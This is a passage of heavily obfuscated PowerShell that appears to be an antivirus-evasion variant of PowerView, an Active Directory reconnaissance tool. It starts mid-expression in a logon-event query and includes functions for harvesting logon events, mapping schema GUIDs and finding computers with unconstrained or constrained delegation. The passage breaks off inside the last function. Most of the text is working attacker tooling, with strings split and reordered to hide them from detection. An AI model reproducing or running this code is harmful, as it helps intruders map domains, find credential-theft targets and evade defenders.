 '  )  -rePlacE'6kw',[chAr]39)  +' ' +  ' '  +  ' '+  ' ' + ' '  + ' '+' '+  '</Selec' +'t>
'+'
 '  +' '+ ' ' + ' ' + ' '+  ' '  +' ' +  ' '  +  '<'  +  '!-- '+'L'+'ogon '  + 'with'+ ' '  + 'ex'+'p'  +  'l'  +  'icit ' +  'crede'+  'ntia'+  'l '  +  'e'  +'ven' + 'ts '+  '-->
'+  ' '  +  ' '  + ' '  +' ' +  ' '  +  ' '  +' '  +' '  + '<'+ 'Se' + 'lect ' +  ((  'Path=' +  'UN'+  'Q'+'Se' +'curity'  +'UN'+'Q>
 '  ) -rEpLACe (  [cHaR]85  + [cHaR]78 + [cHaR]81 ),[cHaR]34  )+  ' ' +' '+' '+' ' + ' ' +  ' '+' '+  ' ' + ' ' +  ' ' +  ' '  +'*' + '[
 ' + ' '+  ' '  +' '  +  ' ' +' '  +' '  +  ' ' +' '  +' '  +  ' '  + ' '+  ' '  +' ' +' '+' '+'System'+'[
 '+' '+' '+' '  +  ' '  + ' '  +' '+' ' +' '  + ' '+ ' '  +  ' '  + ' '  +  ' ' +' '+  ' '  +' '+ ' '  +  ' '  + ' '+  'Provi'  + 'de'+ 'r[
 ' + ' '  +  ' '  + ' '+  ' '+ ' '  +' '  +  ' '+  ' '+ ' '  +' '+  ' ' +  ' '  + ' ' + ' '  +  ' '  +  ' '  +' '+  ' '  + ' '  +  ' '+' '  +  ' '  +' '+ ( '@'+  'Na'  + 'me=c'+  'dKMic'+ 'ros'  +'oft-'  +'Window'  + 's-S' +'ecurity-'+'Audi'+  'tingcdK
 ').RepLAce(  'cdK',[sTrIng][cHaR]39)+' ' + ' '+  ' '  +' ' + ' ' + ' '  +' '+  ' '+  ' '+  ' ' +  ' '  +' '+ ' '  + ' '  +  ' '+  ' ' +' ' +' '+  ' '+ ']' +'
 '  +' '+ ' '  +' '+' '+  ' '+ ' '+  ' '+  ' '  +' '+ ' '  +  ' ' + ' '+  ' ' +  ' ' + ' ' + ' ' + ' '+' ' + ' ' +'and' +' '  +  '('  + 'Le'+'vel=4 '+ 'o' + 'r '  +  'Level=' +  '0)'  +  ' ' +'an'  +'d '+ '(' +'Eve'+  'n'  + 'tID='  + '4648)
 '  +  ' '  +  ' '  +  ' '+  ' '+ ' '  +' '+' ' +  ' '+ ' '+' '+ ' ' +' '  +  ' '+  ' ' +  ' '  +' '  + ' '  + ' '+' ' +  'a' +  'nd '+ 'Tim' +'e'  +  'Cr'+ 'eat'  +  'ed[
 '  +' '+  ' '  +' ' + ' '  +  ' '+ ' ' + ' '  + ' ' +' '  +' '+ ' ' +' '  + ' ' +  ' '  +' '+  ' ' + ' ' +' '+ ' ' +' '  +' '  +' ' +  ' ' +  (('@' +'System'+ 'Tim'+ 'e&g' +  't;=YW'  +'X'  + 'qU7(qU7StartT'  + 'im'+ 'e.'  + 'T'  +  'oUn' +'i' +'vers' + 'alTime'+ '('  + ').ToStri' +  'ng('+  'YWXsYWX))YWX' +' ')  -crepLACE  ( [CHaR]89+  [CHaR]87  +[CHaR]88  ),[CHaR]39-crepLACE  'qU7',[CHaR]36)+ 'an' +'d '  +(  ('@SystemTi'+'me'  + '&'+  'lt;=tITN5m(N' +'5mEndTim'+ 'e.ToUn' +  'iversalTime' +  '()'  + '.'  +  'T' + 'oSt'+  'ring'+  '('  +  't' +  'IT' +  'stIT)'+')'+'t'+  'IT
 ') -REPlAce ( [chaR]116  +[chaR]73  + [chaR]84  ),[chaR]39  -REPlAce  ([chaR]78 +[chaR]53  + [chaR]109  ),[chaR]36  )+  ' '+  ' '+' '+' ' + ' '+ ' '  +' '  +  ' '+  ' '  +  ' '+ ' '+' ' +' ' + ' '+  ' '+  ' ' +' '+  ' '+  ' '  +']' +'
 '  + ' '+  ' '+  ' '  + ' '  +  ' '  + ' ' +  ' '+' '  +' '  +  ' ' +  ' '  +  ' ' +  ' '+' '+' ' +  ']
'  +' ' +' '  + ' ' + ' ' + ' '+' '+' ' + ' ' + ' ' +' ' +  ' '+ ' '  +']
'  + ' '  +  ' '  +' '+ ' ' + ' '  +  ' '+ ' '  +' '+  '<'  +  '/Se'  +'lect>' + '

 '+ ' ' +  ' ' + ' ' +' '+ ' '+' '  +' '  +  '<Supp'+'ress'  +  ' ' + (  'P'  +'at'  + 'h=' + 'H5Q' +  'S' + 'ecurit'  +'yH5Q>
 ').repLAce( 'H5Q',[sTRInG][ChaR]34 ) +  ' '+' ' +' ' +  ' '  + ' '+ ' ' + ' ' +' '  +  ' '+  ' ' + ' ' +'*'  + '[
 '+ ' ' +' ' +  ' '  +  ' '+  ' '  +' '+ ' '  +  ' '+  ' ' +  ' '+' '+  ' '+  ' '  + ' '+ ' '+ 'System'  + '[
 '  + ' '+' '+' ' +' '+ ' ' +  ' ' +' '+ ' ' +  ' ' + ' ' + ' '  +  ' '+  ' '  + ' '+' ' + ' ' +' '+  ' '+  ' '+ 'Pr' +  'o'+  'vi'+'der[
 ' +  ' ' +' '+' ' +  ' '+  ' '  +  ' '  +  ' '  + ' ' +' '+  ' '  +  ' '  + ' '+ ' ' + ' '  +' '+' '+' '+' '+' '  +  ' '+ ' '+ ' ' +  ' '+ (  ( '@Nam'+ 'e'  +  '=m' + 'bPMi'  +'croso' +'ft-Windo' +'w'  + 's-Securit'+ 'y-'  +'A'+ 'u'  +'ditingmb' +  'P
 '  ) -repLAcE(  [chAR]109 + [chAR]98 +[chAR]80 ),[chAR]39) + ' ' +' '+' '  +' ' +  ' '+  ' '  + ' ' +' '  +  ' '+ ' '  +  ' '  +' '  + ' '+ ' '+ ' ' + ' ' +  ' ' + ' '+ ' '  + ']' +  '
 ' + ' ' +  ' '  + ' ' +  ' '+  ' '  +  ' ' +' '+' '  + ' '  +' '+' '+' '  +' '+ ' '  +  ' '  +  ' '+' '+  ' ' + ' ' +'and'  + '
 ' + ' '  +  ' '  +' '+  ' '  +  ' '+ ' '+' '  +  ' ' +  ' '  +  ' '  +  ' ' +' ' +  ' ' + ' '+ ' '  + ' '  +  ' '  +' '+  ' '  +  '(Lev'  +'e'  +  'l=4 '  +'or'+  ' ' + 'Level'  +  '=0) '+  'an'  +'d '  + '(Eve'+'nt'+  'ID=462'  +  '4 '+ 'or'+  ' ' +  'EventID' +'=4625'  +' ' +  'o' +  'r '+ 'EventID=4' +'634' +')
'  + ' ' +' '+' '+' '+  ' '+ ' ' +  ' '+ ' '+  ' '+  ' '  +' '  +' '+' '+ ' '  +  ' '+ ' ' + ']
'+ ' ' +  ' '  +' '+ ' '  + ' '+  ' ' +  ' ' +  ' '  +  ' '+' '+  ' ' +' '+ ']'  +  '
 ' + ' ' +' ' + ' ' +  ' '+' ' +' ' +  ' '  +  ' ' +  ' '  + ' '+ ' '  +'and
'+' ' +' '+' '+  ' '+  ' ' +' '  + ' ' +  ' '  +  ' ' + ' '  +  ' ' +  ' '  + '*'  +  '[
 '+' '  +  ' ' +' ' +  ' ' +  ' '+ ' ' +' '  +  ' '  +  ' '  +' ' + ' '  +' ' +' ' +  ' '+ ' '+ 'Even' + 'tData'  +  '['+'
 '+  ' '+  ' ' + ' ' +  ' '  + ' '  + ' ' +' '+' '+ ' '  + ' ' +  ' '+' '+ ' '  + ' '+ ' '  + ' '+  ' '  + ' ' +  ' ' + '(
'  +' '+' '+ ' ' +  ' '  +  ' '  +' '  +' '+  ' ' +  ' '+ ' ' +' '  +' '+' '+ ' '+' '  +' '+  ' '+  ' '  +' '  + ' '+ ' '  + ' ' +  ' '  + ' ' +('(Data'  +  '['+ '@Na' + 'me='  +  '{0}'  + 'Lo'+ 'go' + 'nTyp'+ 'e{0}]={'  + '0}5{' +  '0} ' ) -F [chAr]39  +'or'  +  ' ' +( ('D'  +'at'+  'a[@Na'+ 'me=sQ' +'gL'+'o'  + 'go' +'nTypesQg'  + ']=s'  +  'Qg0'+ 'sQg)
'+' ')-rEplacE  'sQg',[ChAR]39 )  +  ' '+ ' ' + ' '+' ' + ' '+  ' '+' '  +' ' +' '  + ' '  +  ' '+ ' '+' ' +  ' '+' ' + ' '+' '+ ' '+  ' ' +' ' +' ' +' '  + ' '  + 'or'+ '
 '  +' '+ ' ' +  ' '+  ' '+  ' '  + ' ' +' '+' ' + ' '+' ' +  ' ' + ' ' +  ' '  +  ' '+' '  +' '  +  ' '+  ' '+  ' '  + ' '+  ' ' +  ' '+' ' + ((  'Data[' +'@Na'  + 'm'  +  'e=DI9T'+'ar'+'g'+  'etUser' +'N'+'ameDI9]=DI'+ '9A'+'NONYM' +  'O'+ 'US '  )-RepLace  (  [CHaR]68  +  [CHaR]73 +[CHaR]57 ),[CHaR]39 )+  ('L'  + 'OGO' +  'NjSq'+  '
 '  ).replACE(  (  [char]106+  [char]83  +[char]113  ),[StRiNG][char]39  ) +' '  +' ' +  ' ' +  ' ' + ' ' + ' ' +' '  +  ' '  +' ' + ' '  +  ' '+ ' '+' '+ ' ' +  ' '  +' '  + ' '+  ' '+' '+' '  + ' '  +' '+  ' ' + 'or
'  +' '+' '  + ' '+  ' '+ ' '  +' '  +' '+ ' '+  ' ' + ' '  +' '+ ' '+  ' ' +  ' ' + ' '  +  ' '  + ' ' + ' '  +  ' ' +  ' '+ ' '+  ' '  +' '  + ' '  +  (  'Dat' + 'a['  + '@N'  +'a' +'me' + '=0d'  + 'kT' +  'arge'  +  'tUserSID' + '0dk]='+  '0dkS' +  '-1' +  '-'  +'5-180dk
 ').REplace('0dk',[sTRIng][cHAR]39  )+ ' '  +' '+  ' '  +  ' '  +  ' ' +  ' ' + ' '+' '+' '  +' '  + ' '  + ' '  +  ' '  + ' '+  ' ' + ' '  + ' '  + ' '  +  ' ' +')
' + ' '+' ' +' ' +  ' ' + ' '  +  ' '  +  ' ' + ' ' +' '+ ' ' +' '+ ' ' +' '+ ' ' +' ' + ' '  + ']'+  '
 '  + ' ' +' '+ ' '  +  ' '  +  ' '+  ' ' +' '+ ' ' +' '+  ' '+' '+  ']' +  '
 '  + ' '  +  ' '+ ' '+  ' '+ ' '  +  ' '+' '  +'</S' + 'uppre' +  's'+'s>
 '+  ' '  + ' '  +' ' +( (  '<' +  '/Que'+  'ry>
'  + '</Q' +  'uery'  + 'List'+  '>
'+'wTV') -crEPLAcE ([ChAR]119 + [ChAR]84+  [ChAR]86),[ChAR]34) )
        $EventArguments   =  @{
            (  "{0}{2}{1}" -f 'Filter','h','XPat') = $XPathFilter
            ( "{0}{1}"-f'LogN','ame')   =   (  "{2}{1}{0}" -f'ity','r','Secu')
            ("{0}{2}{1}" -f 'Ma','s','xEvent' )  = $MaxEvents
        }
        if ( $PSBoundParameters[("{0}{2}{1}"-f 'Credenti','l','a'  )]) { $EventArguments[( "{1}{2}{0}"-f'tial','Cre','den' )]   =  $Credential }
    }

    PROCESS {
        ForEach (  $Computer in $ComputerName ) {

            $EventArguments[( "{3}{0}{2}{1}"-f 'omp','ame','uterN','C')]   = $Computer

            Get-WinEvent @EventArguments  | ForEach-Object {
                $Event   =   $_
                $Properties  =  $Event.propERtIEs
                Switch (  $Event.ID) {
                    
                    4624 {
                        
                        if( -not $Properties[5].VAlUe.enDSWITH('$' )  ) {
                            $Output = New-Object ('P'+  'SO'+ 'bject' ) -Property @{
                                cOMPUTernAMe              =   $Computer
                                timeCreAtED                 = $Event.TIMeCREaTeD
                                evENtid                   =   $Event.iD
                                SUbjeCtuseRsid              =   $Properties[0].VALue.TOSTRing( )
                                sUBjectuserNaMe            = $Properties[1].vAluE
                                subJectDomAINnAme         = $Properties[2].value
                                subJectloGonId             = $Properties[3].vaLue
                                taRgETUsErSId              =   $Properties[4].ValUE.tOstrinG()
                                TargeTUsErnaMe              = $Properties[5].VaLUe
                                tARGetdOMaInnAmE           = $Properties[6].vALuE
                                TARGeTlogONid               =   $Properties[7].vAlue
                                lOGonTYpe                  =  $Properties[8].Value
                                LOGONpRoCESsnAMe          = $Properties[9].value
                                aUTHEnticAtionPACKAgeNAme   = $Properties[10].vALUe
                                woRKsTAtiONnAME            =   $Properties[11].value
                                LOgoNgUid                   = $Properties[12].vAlue
                                TRANSMITTEDSErvicES         = $Properties[13].ValUe
                                lMpaCkaGEnAMe               =   $Properties[14].vaLuE
                                kEylENGTH                  =   $Properties[15].valUE
                                ProCEsSID                 = $Properties[16].valuE
                                PRoCeSsnAmE               = $Properties[17].VAluE
                                ipaddress                  =   $Properties[18].VAlue
                                ippORT                     =  $Properties[19].vaLUE
                                imPeRsoNaTIonLEVEL         = $Properties[20].VALUE
                                REStriCTeDadMInMODE       =   $Properties[21].VALUE
                                TArgEtoUTBOUNDUSErNaME     =  $Properties[22].vaLUe
                                tarGEToutBOunddomAiNnaME   =  $Properties[23].ValUE
                                VIRTUaLACcOuNt             =   $Properties[24].vAlue
                                TARGeTlinkEdLOGonID        =   $Properties[25].vAluE
                                eleVAtedTOkeN               =   $Properties[26].VALue
                            }
                            $Output.psoBjECT.typENAMeS.iNseRT(  0, ( "{2}{4}{0}{3}{1}"-f 'og','Event','PowerVi','on','ew.L' ))
                            $Output
                        }
                    }

                    
                    4648 {
                        
                        if(  ( -not $Properties[5].value.eNDsWiTh('$') ) -and (  $Properties[11].VALUe -match (  (  (  "{1}{2}{0}{3}" -f'sz.e','tas','khosti','xe' ) ).REPLAce(  'isz','\'  )  )  )  ) {
                            $Output   =   New-Object ( 'PSO'  +  'bjec' + 't' ) -Property @{
                                compuTeRnaMe              =   $Computer
                                TImECreateD         = $Event.tImECREAtEd
                                evEntID             =  $Event.id
                                sUbjeCTUSERsID      =   $Properties[0].VAlue.ToStRing(  )
                                SubJecTuSERNaME     =   $Properties[1].ValUe
                                suBJeCtDomaInnAME =  $Properties[2].ValUE
                                SUBJECtLOgoNiD     = $Properties[3].ValUE
                                LogonGUid         =  $Properties[4].VaLue.TOStRinG( )
                                tArGetUSernamE      =   $Properties[5].valUe
                                TArGetdOmAINnAmE  =   $Properties[6].vALue
                                TArgetLOGONguID     = $Properties[7].VALuE
                                TargeTservErNAMe   =  $Properties[8].VALUe
                                TArgetiNfO        =  $Properties[9].VaLUE
                                PROCESsID           = $Properties[10].VALuE
                                PRocEssName        =   $Properties[11].vAlUE
                                ipAddress           = $Properties[12].VALUE
                                iPpORt            = $Properties[13].vALUe
                            }
                            $Output.PSObJeCT.tYPEnameS.InserT( 0, ("{5}{2}{7}{6}{3}{0}{1}{4}"-f 'plicitCredent','ialLogonEv','owerVi','Ex','ent','P','w.','e'  ) )
                            $Output
                        }
                    }
                    ('def' +'a'  + 'ult'  ) {
                        Write-Warning "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function GEt`-D`Om`AINgu`idmap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{1}{4}{2}{3}" -f'P','SShould','oce','ss','Pr'}, ''  )]
    [OutputType( [Hashtable] )]
    [CmdletBinding( )]
    Param (
        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{1}{0}{3}{2}"-f 'mai','Do','ller','nContro'})]
        [String]
        $Server,

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize  =  200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  = [Management.Automation.PSCredential]::emPTy
    )

    $GUIDs  = @{( "{5}{4}{1}{0}{2}{3}{6}" -f'0000-','0-','0000-00000','00000','000000-000','00','00'  ) = 'All'}

    $ForestArguments   =   @{}
    if ($PSBoundParameters[(  "{1}{0}{2}" -f 'ia','Credent','l')] ) { $ForestArguments[("{0}{1}{2}"-f'Credent','i','al')] =  $Credential }

    try {
        $SchemaPath  =   ( Get-Forest @ForestArguments ).SCHEMA.NAME
    }
    catch {
        throw ("{2}{3}{14}{12}{5}{16}{13}{19}{4}{7}{1}{17}{8}{20}{6}{9}{0}{11}{18}{21}{10}{15}"-f 'rest ','] ','[G','e','DMa','Do','g ','p','et','fo','ore','s','-','a','t','st','m','Error in r','chema path from ','inGUI','rievin','Get-F'  )
    }
    if (-not $SchemaPath  ) {
        throw (  "{8}{6}{13}{9}{12}{5}{1}{3}{11}{2}{7}{0}{10}{4}"-f 'm G','triev','hema path f','i','Forest','Error in re','-D','ro','[Get','mainG','et-','ng forest sc','UIDMap] ','o'  )
    }

    $SearcherArguments   =  @{
        ( "{2}{1}{3}{0}"-f 'e','rchBa','Sea','s'  )   =  $SchemaPath
        (  "{1}{2}{0}" -f 'ilter','LDA','PF') = ( "{0}{4}{1}{2}{3}" -f'(sche','D','=*',')','maIDGUI'  )
    }
    if ($PSBoundParameters[( "{1}{0}{2}" -f'mai','Do','n'  )]) { $SearcherArguments[( "{0}{1}"-f'Do','main')]   = $Domain }
    if ( $PSBoundParameters[("{0}{1}{2}" -f'Ser','v','er' )]) { $SearcherArguments[(  "{1}{0}"-f 'erver','S'  )] =  $Server }
    if ( $PSBoundParameters[(  "{2}{4}{1}{3}{0}"-f'Size','u','R','ltPage','es' )]) { $SearcherArguments[(  "{0}{4}{2}{3}{1}" -f'R','e','tPa','geSiz','esul')] =  $ResultPageSize }
    if ($PSBoundParameters[(  "{1}{0}{2}{3}"-f 'erverTimeL','S','imi','t' )] ) { $SearcherArguments[( "{0}{4}{1}{3}{2}"-f 'Serv','rTi','it','meLim','e'  )]  =   $ServerTimeLimit }
    if ($PSBoundParameters[( "{0}{2}{1}"-f'Credenti','l','a')] ) { $SearcherArguments[( "{2}{0}{1}"-f'enti','al','Cred')]   =   $Credential }
    $SchemaSearcher   =   Get-DomainSearcher @SearcherArguments

    if ( $SchemaSearcher  ) {
        try {
            $Results = $SchemaSearcher.FINdAll(  )
            $Results   |  Where-Object {$_}  | ForEach-Object {
                $GUIDs[(New-Object (  'G' + 'uid'  ) (  ,$_.prOpERTieS.ScHEMaidguid[0])  ).gUID]  =   $_.pROpeRtiES.nAme[0]
            }
            if ($Results ) {
                try { $Results.dispoSE(  ) }
                catch {
                    Write-Verbose ('[Get-Domai' +'nG' +  'UIDMap'+ ']'+ ' ' +'E'+  'rror '+'disposi' +  'n'  +  'g '  +  'of'+ ' '  +  't'  + 'he '+  'Result' +'s '  +  'o'+ 'b'  +'ject: '  +  "$_")
                }
            }
            $SchemaSearcher.dispOse()
        }
        catch {
            Write-Verbose (  '['  + 'Get-D'+ 'o' +  'mainG'  +  'UIDMap] '  +  'E'  +'rror '+'in'  +  ' '  +  'build'  +  'i'  +  'ng ' +'G' + 'UID ' +'ma' +'p: ' + "$_")
        }
    }

    $SearcherArguments[(  "{3}{2}{0}{1}" -f 'arc','hBase','e','S')]   =   $SchemaPath.rEplacE( (  "{0}{1}{2}" -f'Sch','em','a'  ),("{2}{3}{1}{0}{4}"-f'ig','d-R','Exte','nde','hts' )  )
    $SearcherArguments[( "{2}{0}{1}" -f'APFi','lter','LD'  )]  = ( (  "{4}{0}{6}{5}{8}{1}{7}{3}{2}" -f'ctClas','ce',')','ight','(obje','ontr','s=c','ssR','olAc'  ))
    $RightsSearcher  = Get-DomainSearcher @SearcherArguments

    if ( $RightsSearcher ) {
        try {
            $Results =  $RightsSearcher.FINdalL( )
            $Results   |  Where-Object {$_}  |  ForEach-Object {
                $GUIDs[$_.PROpErtiES.RIgHtSgUId[0].tOstRING()] = $_.ProPErtIES.nAME[0]
            }
            if ( $Results ) {
                try { $Results.diSPoSE( ) }
                catch {
                    Write-Verbose ('[Get-Domain' +'GUIDM' +  'a'  +'p'  +  '] '  + 'Error' +' '+'d' +  'isp'+ 'osing '+'o'+ 'f '  +  't'  +'he '  +  'Re' +  's'+'ults '  +'o'+ 'bje'  +  'ct: '+"$_" )
                }
            }
            $RightsSearcher.DIspOSE( )
        }
        catch {
            Write-Verbose ('['+  'Get-D'  +  'omai' +  'nGUI'+ 'DM'  +'ap] '+ 'Err'+'or '  +  'in'  + ' '  +  'bu'  + 'ildi'  +'ng '+ 'GU' + 'ID '+ 'map:'  +  ' '+"$_")
        }
    }

    $GUIDs
}


function gEt`-D`O`maINCOmp`UTer {


    [OutputType(  {"{2}{4}{3}{0}{1}{5}" -f 'u','t','Powe','ew.Comp','rVi','er'})]
    [OutputType(  {"{4}{3}{1}{0}{2}"-f'uter','View.Comp','.Raw','r','Powe'}  )]
    [CmdletBinding(  )]
    Param ( 
        [Parameter(  PosItIoN   = 0, valUEfrOMpiPeliNE  = $True, vaLUEFroMpIPEliNEbypropeRTyNAME = $True)]
        [Alias( {"{2}{0}{1}"-f 'ntN','ame','SamAccou'}, {"{1}{0}" -f 'e','Nam'}, {"{1}{2}{0}"-f'ame','DN','SHostN'})]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias(  {"{0}{1}{5}{3}{4}{2}" -f 'Servi','cePrin','me','palN','a','ci'}  )]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty( )]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{1}"-f'F','ilter'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{1}{2}{0}"-f 'th','ADS','Pa'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{1}{2}{3}{0}"-f'Controller','Dom','a','in'}  )]
        [String]
        $Server,

        [ValidateSet( {"{0}{1}" -f 'Bas','e'}, {"{0}{1}" -f 'OneLev','el'}, {"{0}{2}{1}"-f 'Su','ee','btr'} )]
        [String]
        $SearchScope = ( "{1}{0}"-f'e','Subtre'),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize  = 200,

        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(  {"{1}{0}" -f'cl','Da'}, {"{1}{0}" -f'roup','G'}, {"{0}{1}" -f'No','ne'}, {"{1}{0}" -f 'ner','Ow'}, {"{0}{1}"-f'Sa','cl'}  )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias( {"{1}{0}{2}" -f 'urn','Ret','One'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential = [Management.Automation.PSCredential]::emPtY,

        [Switch]
        $Raw
     )

    DynamicParam {
        $UACValueNames   = [Enum]::GETNamES(  $UACEnum  )
        
        $UACValueNames  = $UACValueNames   | ForEach-Object {$_  ; "NOT_$_"}
        
        New-DynamicParameter -Name ('UA' + 'C' + 'Fil'+'ter') -ValidateSet $UACValueNames -Type ([array] )
    }

    BEGIN {
        $SearcherArguments  = @{}
        if ($PSBoundParameters[(  "{2}{1}{0}" -f 'ain','m','Do' )]) { $SearcherArguments[( "{0}{1}" -f'Do','main')]   =   $Domain }
        if ( $PSBoundParameters[("{1}{0}{2}" -f 'opertie','Pr','s' )]) { $SearcherArguments[( "{1}{2}{0}" -f 'rties','Prop','e'  )]  = $Properties }
        if ($PSBoundParameters[(  "{0}{2}{1}" -f'S','chBase','ear'  )] ) { $SearcherArguments[(  "{0}{2}{1}"-f'SearchBa','e','s' )]   =  $SearchBase }
        if ( $PSBoundParameters[( "{2}{0}{1}" -f 'v','er','Ser'  )]  ) { $SearcherArguments[( "{0}{2}{1}"-f'Se','er','rv' )]  =  $Server }
        if ($PSBoundParameters[("{2}{1}{3}{0}"-f 'pe','rc','Sea','hSco')] ) { $SearcherArguments[(  "{1}{0}{2}" -f 'e','S','archScope')]   = $SearchScope }
        if (  $PSBoundParameters[( "{0}{3}{1}{2}"-f'R','ultP','ageSize','es' )]) { $SearcherArguments[("{3}{2}{1}{0}"-f 'e','iz','tPageS','Resul'  )]  =   $ResultPageSize }
        if ( $PSBoundParameters[( "{2}{4}{0}{3}{1}" -f 'erTim','it','S','eLim','erv')] ) { $SearcherArguments[("{3}{1}{0}{2}{4}" -f'ver','r','Tim','Se','eLimit')]  =  $ServerTimeLimit }
        if (  $PSBoundParameters[("{2}{1}{3}{0}" -f'ks','tyM','Securi','as'  )]  ) { $SearcherArguments[("{2}{0}{1}" -f'ityM','asks','Secur' )]  =   $SecurityMasks }
        if (  $PSBoundParameters[("{2}{0}{1}"-f 's','tone','Tomb')] ) { $SearcherArguments[(  "{1}{2}{0}"-f 'e','Tombs','ton'  )]  = $Tombstone }
        if (  $PSBoundParameters[(  "{2}{1}{0}" -f'ntial','de','Cre'  )]  ) { $SearcherArguments[("{1}{0}{2}" -f 'a','Credenti','l'  )]  =   $Credential }
        $CompSearcher   =   Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if (  $PSBoundParameters -and ( $PSBoundParameters.CouNt -ne 0 )  ) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if (  $CompSearcher  ) {
            $IdentityFilter   =  ''
            $Filter = ''
            $Identity  | Where-Object {$_}   | ForEach-Object {
                $IdentityInstance =   $_.REpLaCe('(', '\28').ReplaCE(')', '\29'  )
                if ($IdentityInstance -match (  "{1}{0}"-f '-1-','^S' ) ) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ( "{0}{1}"-f'^','CN=' )) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if (  ( -not $PSBoundParameters[("{0}{1}" -f 'Do','main' )] ) -and (  -not $PSBoundParameters[(  "{0}{2}{1}"-f 'Searc','se','hBa')]) ) {
                        
                        
                        $IdentityDomain =   $IdentityInstance.SubSTring( $IdentityInstance.inDeXOF('DC=' )  ) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ( '['+'Get-'  +  'Do'+'ma' + 'inComputer] '  +'Ext'+  'ra'  + 'cted '  + 'do'+  'main '+ "'$IdentityDomain' "  + 'f'+ 'rom '+"'$IdentityInstance'"  )
                        $SearcherArguments[( "{2}{1}{0}" -f 'n','mai','Do')] =  $IdentityDomain
                        $CompSearcher   = Get-DomainSearcher @SearcherArguments
                        if (  -not $CompSearcher) {
                            Write-Warning ( '[Get-' + 'Doma' + 'inC' + 'ompu'  + 't' + 'er' + '] '  +  'Un'+ 'ab'+  'le '+'to'+' '  +  're'  + 'trie'  +'ve ' + 'd'  +'oma'+'in '+'sea'+  'rch'+'er '+  'for' +' ' + "'$IdentityDomain'"  )
                        }
                    }
                }
                elseif ( $IdentityInstance.CoNTAinS('.' )) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$'  ) {
                    $GuidByteString = (([Guid]$IdentityInstance).toByTEArRay(  ) |   ForEach-Object { '\'  +   $_.TOstrInG( 'X2') } ) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ( $IdentityFilter -and (  $IdentityFilter.tRim( ) -ne '' )   ) {
                $Filter += "(|$IdentityFilter)"
            }

            if (  $PSBoundParameters[( "{1}{0}{3}{2}{4}"-f'on','Unc','a','str','ined'  )] ) {
                Write-Verbose (  "{5}{6}{2}{13}{16}{11}{8}{10}{9}{12}{0}{18}{14}{1}{20}{19}{15}{7}{17}{3}{4}"-f 'wi','u','er] Sear','ti','on','[Get-Doma','inComput','ined de','for','mputer',' co',' ','s ','chin','for ','nstra','g','lega','th ','o','nc' )
                $Filter += ( (  "{9}{12}{0}{5}{4}{8}{6}{2}{13}{11}{10}{7}{3}{1}" -f'cco','3:=524288)','.8','.80','o','untContr',':1.2','4','l','(u','1.','0.113556.','serA','4') )
            }
            if (  $PSBoundParameters[("{1}{0}{2}{3}"-f 'ustedToA','Tr','ut','h'  )]) {
                Write-Verbose (  "{6}{14}{15}{10}{9}{11}{2}{5}{8}{13}{4}{7}{3}{1}{0}{12}" -f'ncip','her pri','ters that ','or ot','ate','are truste','[Ge',' f','d to auth','ching for com','mputer] Sear','pu','als','entic','t-D','omainCo' )
                $Filter += (  "{1}{2}{5}{4}{0}{3}{6}" -f 'elegate','(','m','to','ds-allowedtod','s','=*)')
            }
            if ($PSBoundParameters[( "{0}{1}"-f 'Print','ers'  )] ) {
                Write-Verbose ( "{1}{5}{8}{11}{3}{10}{9}{4}{7}{2}{0}{6}" -f ' printe','[Get','r','Sear','f','-Do','rs','o','mainComputer]','g ','chin',' ' )
                $Filter += ( "{2}{6}{1}{0}{5}{3}{4}"-f'or','jectCateg','(o','=print','Queue)','y','b' )
            }
            if ( $PSBoundParameters['SPN']) {
                Write-Verbose ('[Get-'  +'Do'+  'mai'+ 'nComput' +'er'+']'  +' '  + 'S' +'ear'+  'ching '+'fo'+'r '  + 'compu'+ 'te'  +  'r'  + 's '+'wi'+ 'th ' +  'SPN:' +' '  +  "$SPN" )
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ( $PSBoundParameters[(  "{1}{0}{3}{2}"-f 'atingS','Oper','m','yste'  )] ) {
                Write-Verbose ( '['+'Ge' +'t-D' +'omai'+ 'nCom'  +'puter'  +'] ' + 'Search'  + 'ing' +  ' ' +  'f'  +  'or ' +  'co'  +'mputers'+ ' ' + 'with'  +' '+ 'op'+ 'erating'  +' '+  'sys'+  'te' + 'm: '  + "$OperatingSystem" )
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
